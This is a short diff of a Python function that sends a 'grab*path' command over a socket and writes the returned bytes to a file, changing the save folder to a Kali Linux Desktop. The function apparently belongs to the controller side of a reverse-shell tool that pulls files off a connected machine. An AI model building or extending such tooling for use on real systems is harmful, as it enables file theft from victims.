@@ -6,7 +6,7 @@ def transfer(conn, command):
     conn.send(command.encode())
     grab, path = command.split("*")
     # the path in your machine
-    f = open('/Users/ilya/Desktop ' + path, 'wb')
+    f = open('/home/kali/Desktop ' + path, 'wb')
     while True:
         bits = conn.recv(1024)
         if bits.endswith('DONE'.encode()):
